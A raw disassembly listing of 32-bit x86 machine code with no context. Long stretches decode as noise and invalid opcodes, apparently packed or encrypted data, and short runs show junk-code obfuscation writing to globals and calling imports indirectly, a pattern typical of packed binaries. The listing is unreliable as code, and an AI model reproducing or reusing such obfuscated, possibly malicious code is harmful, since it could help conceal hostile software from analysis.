  417dc0:	mov    ds:0x79d75939,al
  417dc5:	xor    al,ch
  417dc7:	dec    esi
  417dc8:	dec    ebp
  417dc9:	xchg   ebx,eax
  417dca:	xor    eax,DWORD PTR [eax-0xb]
  417dcd:	das    
  417dce:	mov    ds:0xa13a659b,al
  417dd3:	fwait
  417dd4:	cmp    al,0xeb
  417dd6:	out    dx,eax
  417dd7:	xchg   edi,eax
  417dd8:	dec    ebx
  417dd9:	jmp    0x61ca5726
  417dde:	test   DWORD PTR [esi+edi*4],ebx
  417de1:	fsub   QWORD PTR ds:[esi+0x4c]
  417de5:	xor    al,0xaf
  417de7:	xor    ebx,DWORD PTR [esp+esi*2+0xde88092]
  417dee:	scas   al,BYTE PTR es:[edi]
  417def:	mov    ecx,0xdb60a623
  417df4:	cdq    
  417df5:	stos   DWORD PTR es:[edi],eax
  417df6:	adc    esi,DWORD PTR [ebx+0x58]
  417df9:	dec    esi
  417dfa:	dec    eax
  417dfb:	out    0x83,al
  417dfd:	pop    ds
  417dfe:	out    0x13,eax
  417e00:	sub    DWORD PTR [ebp-0x19093761],edi
  417e06:	push   es
  417e07:	and    eax,0x6acffedf
  417e0c:	pop    ebx
  417e0d:	(bad)  
  417e0e:	jle    0x417e5e
  417e10:	fbld   TBYTE PTR [eax+edx*2+0x5ad259f9]
  417e17:	pushf  
  417e18:	inc    BYTE PTR [ebx]
  417e1a:	sar    ecx,1
  417e1c:	movd   DWORD PTR [ecx+edi*8-0x6aeac4ac],mm7
  417e24:	sbb    BYTE PTR [edi],ah
  417e26:	and    cl,BYTE PTR [edi-0x39]
  417e29:	jmp    0x344a9f00
  417e2e:	mov    bl,BYTE PTR [esi-0x5c]
  417e31:	lds    eax,FWORD PTR [edi]
  417e33:	int    0xd
  417e35:	xchg   edx,eax
  417e36:	lods   al,BYTE PTR ds:[esi]
  417e37:	mov    edi,0xb7d955cc
  417e3c:	sbb    eax,0xf91a3432
  417e41:	xchg   DWORD PTR [esi+ebx*8+0x4c],edx
  417e45:	das    
  417e46:	sub    BYTE PTR [esi-0x7d],al
  417e49:	fbld   TBYTE PTR [esi-0x1f84a948]
  417e4f:	sbb    DWORD PTR [ebp-0x71c84ace],edi
  417e55:	int3   
  417e56:	jmp    0x1ca4:0x7cb82c04
  417e5d:	ret    0x5d6a
  417e60:	popa   
  417e61:	mov    bl,0x95
  417e63:	and    DWORD PTR [ebx+eax*4-0x4430bc08],0x7c5316f4
  417e6e:	push   ebx
  417e6f:	lahf   
  417e70:	retf   
  417e71:	jmp    0x417dfb
  417e73:	aam    0x50
  417e75:	das    
  417e76:	lea    ecx,[edi-0x32]
  417e79:	jbe    0x417ead
  417e7b:	push   edi
  417e7c:	repz fdiv st,st(7)
  417e7f:	push   ebp
  417e80:	mov    ?,ecx
  417e82:	repz pop esp
  417e84:	rcl    ecx,cl
  417e86:	xor    DWORD PTR [edx-0x5e411664],ebx
  417e8c:	nop
  417e8d:	sti    
  417e8e:	nop    esp
  417e91:	pop    ebx
  417e92:	mov    edx,0x138f0aa6
  417e97:	xor    eax,DWORD PTR [eax-0x71]
  417e9a:	xor    DWORD PTR [ebx+0x2d],0xe85149e3
  417ea1:	xor    BYTE PTR [ebx],0x31
  417ea4:	int    0x71
  417ea6:	enter  0x799d,0xef
  417eaa:	hlt    
  417eab:	xor    dl,BYTE PTR [ecx+0xe6a55c9]
  417eb1:	add    edi,0x44
  417eb4:	and    al,0x3c
  417eb6:	aad    0x63
  417eb8:	add    BYTE PTR [eax],al
  417eba:	mov    DWORD PTR ds:0x42834f,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x428213,0x42826b
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x428363,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x42825f,0x1cb6
  417f20:	mov    DWORD PTR ds:0x42835b,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x428363,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428e68
  417f43:	sub    DWORD PTR ds:0x428237,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x42821b
  417f53:	mov    ecx,DWORD PTR ds:0x42827b
  417f59:	and    DWORD PTR ds:0x428177,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x428353
  417f65:	mov    ecx,DWORD PTR ds:0x428167
  417f6b:	or     DWORD PTR ds:0x4282fb,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x42837f
  417f77:	or     DWORD PTR ds:0x428267,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0xffffffcd
  417f8f:	loopne 0x417ffc
  417f91:	mov    al,0x53
  417f93:	fst    DWORD PTR [esi]
  417f95:	sbb    BYTE PTR [edx+edx*1+0x3cb11818],bh
  417f9c:	imul   ebp,DWORD PTR [edi],0x912dce4f
  417fa2:	and    BYTE PTR [eax],bh
  417fa4:	sub    DWORD PTR [edi-0x78],esi
  417fa7:	std    
  417fa8:	repz dec ebx
  417faa:	call   0xd014:0x99685190
  417fb1:	pop    eax
  417fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fb3:	adc    dh,BYTE PTR [ecx-0x24e3ae4f]
  417fb9:	shr    DWORD PTR [edi-0x65df119d],cl
  417fbf:	jb     0x417f79
  417fc1:	dec    ebp
  417fc2:	imul   ebx,DWORD PTR [eax+eax*2+0x1503b6c5],0x7d
  417fca:	in     eax,0x2
  417fcc:	dec    ecx
  417fcd:	mov    edi,0xcf452314
  417fd2:	ds sti 
  417fd4:	je     0x417f9b
  417fd6:	in     al,0xae
  417fd8:	fiadd  WORD PTR [ecx+0x65]
  417fdc:	fmul   QWORD PTR [edx]
  417fde:	jg     0x417f7d
  417fe0:	mov    WORD PTR ds:0x635f8387,fs
  417fe6:	imul   eax,eax,0x277c1d9e
  417fec:	push   edi
  417fed:	data16 (bad) 
  417fef:	imul   edx,DWORD PTR [ecx-0x6cda08aa],0xffffff8c
  417ff6:	mov    bl,0x42
  417ff8:	or     eax,0x77b68a10
  417ffd:	or     eax,0xffffffd1
  418000:	mov    esi,0xf4ba17fd
  418005:	js     0x418063
  418007:	outs   dx,DWORD PTR ds:[esi]
  418008:	push   eax
  418009:	jp     0x417fd5
  41800b:	inc    esp
  41800c:	dec    esi
  41800d:	sbb    eax,0xe82b77b9
  418012:	mov    esi,cs
  418014:	or     DWORD PTR [ebx-0x5d],0xa0479efa
  41801b:	and    eax,DWORD PTR ds:0xd88b055e
  418021:	ret    0x251f
  418024:	cmp    eax,0xb74ef0ac
  418029:	aad    0x88
  41802b:	in     al,0x98
  41802d:	shl    DWORD PTR [edx-0x424daeab],1
  418033:	loopne 0x418017
  418035:	pop    es
  418036:	lea    ebp,[esi-0x1fe08c57]
  41803c:	cmp    al,0x1f
  41803e:	inc    eax
  41803f:	mov    eax,ds:0x1daff1e7
  418044:	cld    
  418045:	das    
  418046:	enter  0xc5aa,0xf9
  41804a:	dec    edi
  41804b:	out    dx,eax
  41804c:	rol    esp,cl
  41804e:	xor    dl,BYTE PTR [ebx]
  418050:	rol    DWORD PTR [ebx+0x77],cl
  418053:	shr    edi,0x83
  418056:	js     0x4180b1
  418058:	push   ecx
  418059:	shl    BYTE PTR [ecx+edi*8],1
  41805c:	xor    al,0x92
  41805e:	shr    DWORD PTR [ecx-0x6e64b41e],cl
  418064:	ja     0x4180ce
  418066:	mov    BYTE PTR [eax],dh
  418068:	cmp    al,0x90
  41806a:	mov    dh,0x19
  41806c:	dec    esi
  41806d:	call   0x85ad:0xad133c1b
  418074:	stos   BYTE PTR es:[edi],al
  418075:	aam    0x3a
  418077:	mov    WORD PTR [ebx+0x2f],fs
  41807a:	sub    al,0x60
  41807c:	jle    0x418052
  41807e:	out    0x1e,eax
  418080:	xchg   ecx,eax
  418081:	adc    ecx,edx
  418083:	int3   
  418084:	push   edx
  418085:	inc    ebp
  418086:	sub    eax,0x46e145a7
  41808b:	jns    0x418070
  41808d:	and    DWORD PTR [esi-0x1c],0xfffffff9
  418091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418092:	arpl   cx,di
  418094:	pop    edx
  418095:	jmp    0x6595:0x90881d5d
  41809c:	or     eax,0x44655d6f
  4180a1:	xchg   esi,eax
  4180a2:	loope  0x41810e
  4180a4:	mov    eax,ds:0xb469c58a
  4180a9:	jae    0x418103
  4180ab:	xchg   ch,al
  4180ad:	dec    ecx
  4180ae:	fs (bad) 
  4180b0:	mov    ebx,0x10089726
  4180b5:	jbe    0x418050
  4180b7:	fwait
  4180b8:	addr16 popf 
  4180ba:	mov    esi,0x59d60271
  4180bf:	pop    eax
  4180c0:	cmp    BYTE PTR [ecx],dh
  4180c2:	mov    edx,0x3703b2e
  4180c7:	sub    DWORD PTR [ebx-0x1612012d],eax
  4180cd:	jo     0x4180cd
  4180cf:	mov    esi,0xbee3545d
  4180d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180d5:	scas   eax,DWORD PTR es:[edi]
  4180d6:	inc    eax
  4180d7:	enter  0x465e,0xc7
  4180db:	aaa    
  4180dc:	xchg   esi,eax
  4180dd:	and    BYTE PTR [ebp-0x52],bh
  4180e0:	and    al,0xa8
  4180e2:	cmp    ch,al
  4180e4:	les    esi,FWORD PTR [esp+ecx*8-0x7d]
  4180e8:	ds test eax,0x4835d422
  4180ee:	arpl   WORD PTR [eax+0x6b8bca22],di
  4180f4:	scas   eax,DWORD PTR es:[edi]
  4180f5:	ficomp WORD PTR [ebx+0x13]
  4180f8:	in     al,0x97
  4180fa:	das    
  4180fb:	hlt    
  4180fc:	ret    
  4180fd:	inc    edi
  4180fe:	add    DWORD PTR ds:0xa14e98c1,ebx
  418104:	sbb    al,0x95
  418106:	push   0xffffff80
  418108:	test   DWORD PTR [ebx+0x1a5e0515],edx
  41810e:	push   ecx
  41810f:	or     eax,DWORD PTR [edi-0x84466b3]
  418115:	and    dl,BYTE PTR [ecx+0x75]
  418118:	sub    DWORD PTR [edx+0x7d3fcc18],eax
  41811e:	jge    0x41813f
  418120:	scas   al,BYTE PTR es:[edi]
  418121:	xchg   BYTE PTR [ecx+0x17],bh
  418124:	in     al,dx
  418125:	enter  0xea18,0xa2
  418129:	cmp    eax,0xc48fca78
  41812e:	cmp    DWORD PTR [ebx+0x2c],edi
  418131:	cmc    
  418132:	adc    BYTE PTR [ecx+0x1e],al
  418135:	aaa    
  418136:	gs rol esp,0x80
  41813a:	sub    ah,0xa9
  41813d:	popa   
  41813e:	test   eax,0xc38b7a05
  418143:	sub    ecx,ecx
  418145:	fs stos BYTE PTR es:[edi],al
  418147:	mov    WORD PTR [edx],gs
  418149:	gs xor ebp,eax
  41814c:	sub    al,0x5e
  41814e:	add    eax,0xd4952ea
  418153:	imul   ebp,esp,0xffffffad
  418156:	mov    eax,esp
  418158:	repnz mov ds,edi
  41815b:	jmp    0x418143
  41815d:	xor    ah,BYTE PTR [ebp-0x2e8be484]
  418163:	and    dh,BYTE PTR [esi-0x42]
  418166:	pop    ds
  418167:	mov    esp,0xfaa2188a
  41816c:	or     eax,0x89a391f
  418171:	jae    0x4181ab
  418173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418174:	mov    ebp,DWORD PTR [edx]
  418176:	daa    
  418177:	sbb    BYTE PTR ds:0x36613f15,dh
  41817d:	sbb    al,0x76
  41817f:	cld    
  418180:	nop
  418181:	jmp    0xb7f4:0x2346c978
  418188:	mov    esp,0x30d9baf7
  41818d:	pop    es
  41818e:	fidiv  DWORD PTR [ebx-0x72]
  418191:	pop    edi
  418192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418193:	arpl   WORD PTR [eax+0x48],ax
  418196:	xor    dl,BYTE PTR [edx]
  418198:	mov    ebx,0xf62a5057
  41819d:	aas    
  41819e:	sahf   
  41819f:	ret    0x3371
  4181a2:	ret    
  4181a3:	dec    esp
  4181a4:	and    edi,DWORD PTR [ebp-0x1087d3f8]
  4181aa:	rep outs dx,DWORD PTR ds:[esi]
  4181ac:	fdiv   DWORD PTR [eax+0x55]
  4181af:	lahf   
  4181b0:	push   edi
  4181b1:	fxch   st(2)
  4181b3:	lods   eax,DWORD PTR ds:[esi]
  4181b4:	cld    
  4181b5:	inc    BYTE PTR [ebx+0x3f56e3b9]
  4181bb:	imul   esi,DWORD PTR [edi-0xf],0xa42493f3
  4181c2:	nop
  4181c3:	cdq    
  4181c4:	and    ah,BYTE PTR ds:0xb62ab942
  4181ca:	lods   eax,DWORD PTR ds:[esi]
  4181cb:	fs and eax,0x3e6e7bf3
  4181d2:	add    ebx,DWORD PTR [eax]
  4181d4:	mov    bh,0x25
  4181d6:	test   al,0x32
  4181d8:	leave  
  4181d9:	inc    ecx
  4181da:	outs   dx,BYTE PTR ds:[esi]
  4181db:	aaa    
  4181dc:	lods   al,BYTE PTR cs:[esi]
  4181de:	xor    DWORD PTR [eax+0x366f7352],ebx
  4181e4:	fstp   QWORD PTR [ebx]
  4181e6:	mov    edx,0xa738255b
  4181eb:	pop    ecx
  4181ec:	mov    ch,0xf8
  4181ee:	(bad)  
  4181ef:	lds    edi,FWORD PTR [esi-0x14ea09fe]
  4181f5:	jbe    0x41826f
  4181f7:	loope  0x418229
  4181f9:	inc    esp
  4181fa:	nop
  4181fb:	xchg   DWORD PTR ds:0xfcf2b399,edx
  418201:	adc    ch,BYTE PTR [eax-0x5e]
  418204:	mov    edi,0x620c4dad
  418209:	jbe    0x418255
  41820b:	fs sahf 
  41820d:	stos   BYTE PTR es:[di],al
  41820f:	retf   
  418210:	add    DWORD PTR [esp+edi*4+0x21],esi
  418214:	jmp    0x418218
  418216:	in     eax,0xf2
  418218:	push   ebp
  418219:	das    
  41821a:	inc    ecx
  41821b:	fnstenv [ecx-0x1e51e75b]
  418221:	add    eax,0xef6256b1
  418226:	adc    DWORD PTR [esi+0x19a6efca],edx
  41822c:	test   BYTE PTR ds:0x63066b2b,0x62
  418233:	push   ebx
  418234:	fwait
  418235:	cmp    BYTE PTR [edx-0x48],bh
  418238:	cli    
  418239:	inc    BYTE PTR [ecx]
  41823b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41823c:	bound  edi,QWORD PTR [ebx+0x6f7ca3f2]
  418242:	mov    ebx,0xa1a9d4a0
  418247:	icebp  
  418248:	mov    ecx,0x4d26ac0e
  41824d:	inc    ebp
  41824e:	fmul   DWORD PTR [ecx+0x5f]
  418251:	pop    edx
  418252:	cmp    al,0x22
  418254:	mov    dh,0xd9
  418256:	enter  0x4c09,0xbb
  41825a:	inc    esp
  41825b:	fsubr  DWORD PTR [ecx-0x6b66f8f3]
  418261:	dec    ebp
  418262:	mov    edi,DWORD PTR [eax]
  418264:	jge    0x418239
  418266:	pop    eax
  418267:	dec    ecx
  418268:	stos   BYTE PTR es:[edi],al
  418269:	stos   BYTE PTR es:[edi],al
  41826a:	and    bh,BYTE PTR [esi+0x4c4ef5a4]
  418270:	imul   ebx,DWORD PTR [ebx+ebx*2-0x1a3cd688],0x54
  418278:	imul   ebx,ecx,0x74
  41827b:	pop    ss
  41827c:	jnp    0x4182a8
  41827e:	iret   
  41827f:	test   eax,0xec71ab64
  418284:	imul   ebx,edi,0x31
  418287:	aas    
  418288:	hlt    
  418289:	ja     0x4182ec
  41828b:	loope  0x418261
  41828d:	mov    dl,0x9f
  41828f:	mov    edx,0xb117c7a1
  418294:	push   ds
  418295:	ins    DWORD PTR es:[edi],dx
  418296:	lahf   
  418297:	ret    0x6a4d
  41829a:	mov    al,ds:0xe769c211
  41829f:	hlt    
  4182a0:	push   esi
  4182a1:	fisubr WORD PTR [esi-0x67]
  4182a4:	cmp    BYTE PTR es:[ebx-0x1dd7d6f6],dl
  4182ab:	push   0x3a
  4182ad:	mov    ah,0x15
  4182af:	sbb    BYTE PTR [edx],0x24
  4182b2:	call   0x9b6f:0x1eae86f0
  4182b9:	add    al,0x3a
  4182bb:	adc    eax,0xd81a596c
  4182c0:	push   edx
  4182c1:	mov    ds:0x930b849,al
  4182c6:	nop
  4182c7:	pushf  
  4182c8:	xchg   esp,eax
  4182c9:	cld    
  4182ca:	and    eax,0xf335d78
  4182cf:	popa   
  4182d0:	js     0x4182d5
  4182d2:	xchg   esi,eax
  4182d3:	jge    0x418285
  4182d5:	ins    BYTE PTR es:[edi],dx
  4182d6:	repnz fimul DWORD PTR [eax-0x5b]
  4182da:	jbe    0x41826e
  4182dc:	test   eax,0xf705b6b0
  4182e1:	mov    BYTE PTR [ebp-0x2f],ah
  4182e4:	mov    ebp,0x5a72b468
  4182e9:	jns    0x4182ef
  4182eb:	enter  0x4a29,0x78
  4182ef:	sub    eax,0x831c793e
  4182f4:	outs   dx,DWORD PTR ds:[esi]
  4182f5:	xchg   edi,eax
  4182f6:	ins    BYTE PTR es:[edi],dx
  4182f7:	mov    edx,0xe89197a6
  4182fc:	test   esi,edi
  4182fe:	mov    ds:0x59bc43f9,eax
  418303:	mov    edi,0xd19ce614
  418308:	mov    edi,0xfa9e2705
  41830d:	ds push 0x7329e528
  418313:	jae    0x41829a
  418315:	jnp    0x4182f8
  418317:	lods   al,BYTE PTR ds:[esi]
  418318:	push   esp
  418319:	in     al,0x68
  41831b:	add    BYTE PTR [eax+0x37f190fd],al
  418321:	call   0x3b27:0x3ca92c7b
  418328:	push   ss
  418329:	cmc    
  41832a:	xchg   BYTE PTR [ebx-0x125b3e66],ch
  418330:	in     al,dx
  418331:	ja     0x41838e
  418333:	fucomip st,st(2)
  418335:	xor    bh,BYTE PTR [eax]
  418337:	outs   dx,BYTE PTR ds:[esi]
  418338:	idiv   BYTE PTR [ecx+0x55]
  41833b:	add    ebp,DWORD PTR [ebx+0x6b]
  41833e:	mov    edx,0xb61f762f
  418343:	call   0x5975:0xfe91b8c5
  41834a:	push   0x8b30ff50
  41834f:	inc    esp
  418350:	and    al,0x34
  418352:	cmp    DWORD PTR ds:0x428167,0x0
  418359:	mov    DWORD PTR ds:0x42822b,0x42c6
  418363:	mov    DWORD PTR ds:0x428367,edx
  418369:	mov    DWORD PTR ds:0x428143,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x428267,0x243f
  418382:	mov    DWORD PTR ds:0x42823f,0x6875
  41838c:	cmp    DWORD PTR ds:0x428167,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x428303
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428e6c
  4183ae:	add    DWORD PTR ds:0x4282cf,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x428253
  4183ba:	xor    DWORD PTR ds:0x428307,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x4282e3
  4183c6:	or     DWORD PTR ds:0x42815f,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x42820b,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x42820f,0x42817b
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x42816f,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x42836f
  418409:	or     DWORD PTR ds:0x428367,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42813f,0x428307
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x42820b,0x0
  418430:	mov    DWORD PTR ds:0x42821b,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x428363,0x5a59
  41844e:	cmp    DWORD PTR ds:0x42820b,0x0
  418455:	jl     0x41847f
  41845b:	push   0x428063
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428dc8
  41846b:	sbb    DWORD PTR ds:0x42824f,0x4c8f
  418475:	mov    DWORD PTR ds:0x428147,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x428363
  418485:	xor    ecx,DWORD PTR ds:0x4282cb
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x428367,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x4282df,0x42824b
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x428387,0x42820f
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x4282db,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	and    eax,0xf67cb59a
  4184fc:	rcl    DWORD PTR [esi],1
  4184fe:	sbb    BYTE PTR [edx+edx*1+0x538f1818],bh
  418505:	and    al,0xa6
  418508:	std    
  418509:	test   eax,0x11057061
  41850e:	add    BYTE PTR [ebp+0x5],bl
  418511:	mov    esp,0x99900d8e
  418516:	cmp    bl,bh
  418518:	aad    0x88
  41851a:	xor    DWORD PTR [ecx-0x67ae3dfd],0xfffffff7
  418521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418522:	push   es
  418523:	retf   
  418524:	and    BYTE PTR [edi-0x3e],ch
  418527:	push   edx
  418528:	gs push ebp
  41852a:	mov    bl,0x9f
  41852c:	cmc    
  41852d:	mov    bh,0xfa
  41852f:	jmp    0xa07c5149
  418534:	sbb    ah,ah
  418536:	dec    DWORD PTR [edi]
  418538:	xor    al,dh
  41853a:	dec    esp
  41853b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41853c:	mov    bl,0x4e
  41853e:	xchg   ebp,eax
  41853f:	jp     0x4184d1
  418541:	(bad)  
  418543:	mov    bh,0x20
  418545:	jl     0x4184ee
  418547:	mov    DWORD PTR [esi-0x527b8d32],eax
  41854d:	inc    ebx
  41854e:	adc    ecx,DWORD PTR [edi+0x2fa61231]
  418554:	sbb    esp,DWORD PTR ds:0xad99edfb
  41855a:	xor    DWORD PTR [ecx],esp
  41855c:	lods   al,BYTE PTR ds:[esi]
  41855d:	pop    esi
  41855e:	es popa 
  418560:	jmp    0x4185b0
  418562:	xor    edi,DWORD PTR [ecx]
  418564:	mov    dh,0xcf
  418566:	xlat   BYTE PTR ds:[ebx]
  418567:	jns    0x4185be
  418569:	add    edi,DWORD PTR [esi]
  41856b:	adc    eax,DWORD PTR [ecx+0x6b]
  41856e:	repnz popf 
  418570:	adc    bh,0xdd
  418573:	mov    esi,0xff8f3cae
  418578:	cmc    
  418579:	jp     0x4185ee
  41857b:	mov    ds:0xfb29937a,al
  418580:	cmp    ebp,ecx
  418582:	or     al,0xf4
  418584:	stos   BYTE PTR es:[edi],al
  418585:	push   cs
  418586:	outs   dx,DWORD PTR ds:[esi]
  418587:	neg    al
  418589:	mov    dl,0xa1
  41858b:	add    DWORD PTR [edx-0x3f],esp
  41858e:	sti    
  41858f:	fdivr  DWORD PTR [eax-0xd0daf45]
  418595:	scas   al,BYTE PTR es:[edi]
  418596:	imul   ebp,DWORD PTR [eax+0x14d4cd16],0xda6f53a9
  4185a0:	lods   al,BYTE PTR ds:[esi]
  4185a1:	mov    DWORD PTR [ebp+0x41b5d9e5],ebx
  4185a7:	jle    0x418568
  4185a9:	lods   eax,DWORD PTR ds:[esi]
  4185aa:	push   0x58
  4185ac:	loop   0x4185eb
  4185ae:	into   
  4185af:	mov    edi,0x4de90b8e
  4185b4:	pop    es
  4185b5:	push   esp
  4185b6:	mov    eax,ds:0x411b23bf
  4185bb:	fcomp  DWORD PTR [eax]
  4185bd:	jb     0x418610
  4185bf:	xchg   edi,eax
  4185c0:	popaw  
  4185c2:	int    0xe4
  4185c4:	stos   DWORD PTR es:[edi],eax
  4185c5:	push   edx
  4185c6:	inc    esp
  4185c7:	push   ss
  4185c8:	dec    ebx
  4185c9:	inc    ebx
  4185ca:	ins    BYTE PTR es:[edi],dx
  4185cb:	cmp    BYTE PTR [ebx],dh
  4185cd:	push   esi
  4185ce:	int3   
  4185cf:	mov    al,ds:0x6dcd44a1
  4185d4:	dec    edx
  4185d5:	push   ds
  4185d6:	mov    dl,ch
  4185d8:	add    eax,0x6fe40dba
  4185dd:	and    dl,dh
  4185df:	loopne 0x418659
  4185e1:	mov    bl,0x59
  4185e3:	mov    ds:0xedbd2652,eax
  4185e8:	inc    edx
  4185e9:	into   
  4185ea:	bound  edi,QWORD PTR [ecx-0x10]
  4185ed:	dec    esp
  4185ee:	iret   
  4185ef:	test   BYTE PTR [edx+edx*8],ah
  4185f2:	lock repnz out dx,al
  4185f5:	dec    esi
  4185f6:	jl     0x41863e
  4185f8:	xchg   DWORD PTR [ecx],ecx
  4185fa:	pop    ds
  4185fb:	xlat   BYTE PTR ds:[ebx]
  4185fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185fd:	sub    DWORD PTR [eax],eax
  4185ff:	ret    0x99a7
  418602:	cdq    
  418603:	xor    edi,DWORD PTR ds:0xe3fb9140
  418609:	inc    esp
  41860a:	dec    esi
  41860b:	loop   0x4185b4
  41860d:	into   
  41860e:	aaa    
  41860f:	aad    0x6f
  418611:	jno    0x4185aa
  418613:	inc    edx
  418614:	jnp    0x418644
  418616:	pop    ds
  418617:	out    dx,eax
  418618:	jl     0x418601
  41861a:	stos   BYTE PTR es:[edi],al
  41861b:	outs   dx,BYTE PTR ds:[esi]
  41861c:	outs   dx,DWORD PTR ds:[esi]
  41861d:	dec    edi
  41861e:	sub    al,0x64
  418620:	test   DWORD PTR [ebx-0x229fdf7b],esi
  418626:	pop    ecx
  418627:	cmp    edi,DWORD PTR [edx+0x21]
  41862a:	push   0x3defd5a9
  41862f:	push   cs
  418630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418631:	mov    edi,0xf148ae49
  418636:	data16 ja 0x4185f8
  418639:	sub    al,0xdb
  41863b:	gs scas al,BYTE PTR es:[edi]
  41863d:	mov    BYTE PTR [edx+0xf7cbbf0],0x51
  418644:	sbb    BYTE PTR [edi],bl
  418646:	in     al,dx
  418647:	fsubr  DWORD PTR [ebp-0x75]
  41864a:	mov    ds:0xb1913058,al
  41864f:	mov    ebx,0xda1b9029
  418654:	jp     0x41864f
  418656:	jmp    0x18b2:0x8ceeb3df
  41865d:	cli    
  41865e:	sar    DWORD PTR [ecx-0x5d],0xf7
  418662:	jmp    0xc11d:0x9355f9bd
  418669:	fs or  eax,0x8da300c7
  41866f:	ret    
  418670:	add    dl,ah
  418672:	jg     0x4186dd
  418674:	clc    
  418675:	les    ecx,FWORD PTR [eax-0x431b907e]
  41867b:	mov    edi,0x83f9bbcb
  418680:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418682:	sbb    BYTE PTR [ecx-0x17],bh
  418685:	popa   
  418686:	sbb    dl,dl
  418688:	fnsave [esi+0x3f9c0647]
  41868e:	(bad)  
  41868f:	push   eax
  418690:	imul   DWORD PTR fs:[eax]
  418693:	retf   
  418694:	jle    0x4186bd
  418696:	xchg   ebx,eax
  418697:	ror    DWORD PTR [eax-0x67f85d84],cl
  41869d:	test   eax,0x625d2948
  4186a2:	es (bad) 
  4186a4:	cmp    DWORD PTR [ebx+edx*1+0x478f5e62],edx
  4186ab:	dec    eax
  4186ac:	fdiv   QWORD PTR [edx+ebx*8-0x677bc232]
  4186b3:	test   DWORD PTR [ebx-0x6d],ebx
  4186b6:	and    al,BYTE PTR [edi+0x6d110388]
  4186bc:	push   cs
  4186bd:	lods   eax,DWORD PTR ds:[esi]
  4186be:	push   cs
  4186bf:	or     BYTE PTR [edi],0x7e
  4186c2:	mov    BYTE PTR [ecx+0x8],bh
  4186c5:	rol    BYTE PTR [eax],1
  4186c7:	mov    ds:0x7ea0db0c,al
  4186cc:	jg     0x41871f
  4186ce:	jo     0x418742
  4186d0:	mov    dl,0xbf
  4186d2:	and    edi,DWORD PTR [eax*1-0x14c8b2e0]
  4186d9:	fmul   QWORD PTR [edi-0x30]
  4186dc:	pop    ss
  4186dd:	adc    dh,dl
  4186df:	jg     0x41873f
  4186e1:	mov    ss,WORD PTR [esi+0x6e]
  4186e4:	push   0xa3966981
  4186e9:	pop    es
  4186ea:	dec    esp
  4186eb:	add    dl,BYTE PTR [ebx]
  4186ed:	shl    BYTE PTR [ebx-0x3],1
  4186f0:	popf   
